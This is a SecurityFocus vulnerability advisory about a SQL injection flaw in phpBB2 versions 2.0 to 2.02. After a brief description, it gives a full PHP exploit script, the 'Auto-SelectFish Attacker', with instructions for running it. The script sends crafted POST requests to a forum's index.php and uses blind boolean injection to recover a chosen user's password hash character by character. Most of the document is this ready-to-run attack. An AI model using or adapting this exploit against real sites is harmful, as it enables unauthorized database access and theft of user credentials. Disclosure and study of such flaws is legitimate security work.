source: http://www.securityfocus.com/bid/6888/info

A SQL injection vulnerability has been reported in phpBB2.

phpBB2, in some cases, does not sufficiently sanitize user-supplied input which is used when constructing SQL queries. As a result, attackers may supply malicious parameters to manipulate the structure and logic of SQL queries. This may result in unauthorized operations being performed on the underlying database. This issue may be exploited to cause sensitive information to be disclosed to a remote attacker. 

<?php

########## PHPBB 2.0,2.01,2.02 Auto-SelectFish Attacker
########## David@cgishield.com


// To use this program, simply upload it to a php enabled webserver, and execute
// If php times out before the whole password hash is determined, 
// adjust the maximum script execution time in php.ini
// Also, replace following with correct values:

$server="192.168.1.100";
$script="/phpbb2/index.php";
$the_userid_to_hack="2";


// don't change this
$data_to_match="In total there are <b>0</b> users online";

$checkchar[0]="char(48)";
$checkchar[1]="char(49)";
$checkchar[2]="char(50)";
$checkchar[3]="char(51)";
$checkchar[4]="char(52)";
$checkchar[5]="char(53)";
$checkchar[6]="char(54)";
$checkchar[7]="char(55)";
$checkchar[8]="char(56)";
$checkchar[9]="char(57)";
$checkchar[a]="char(97)";
$checkchar[b]="char(98)";
$checkchar[c]="char(99)";
$checkchar[d]="char(100)";
$checkchar[e]="char(101)";
$checkchar[f]="char(102)";

for($i=1;$i<33;$i++){
reset($checkchar);
while (list($i2, $i2val) = @each($checkchar)){
$vars="forum_id=1+or+user_id=$the_userid_to_hack+and+mid(user_password,$i,1)=$checkchar[$i2]/*";
$data=sendToHost("$server",'post',"$script","$vars");
if (eregi("$data_to_match","$data")){
//echo("<b>$i2</b>");
}
else{echo("<br>$i= $i2"); flush();break;}
}
}


function sendToHost($host,$method,$path,$data,$useragent=1)
{
$method = strtoupper($method);
$fp = fsockopen($host,80);
fputs($fp, "$method $path HTTP/1.1\n");
fputs($fp, "Host: $host\n");
fputs($fp, "Content-type: application/x-www-form-urlencoded\n");
fputs($fp, "Content-length: " . strlen($data) . "\n");
if ($useragent)
fputs($fp, "User-Agent: Mozilla\n");
fputs($fp, "Connection: close\n\n");
if ($method == 'POST')
fputs($fp, $data);
while (!feof($fp))
$buf .= fgets($fp,128);
fclose($fp);
for($slow=0;$slow<100;$slow++){}

return $buf;
}

?>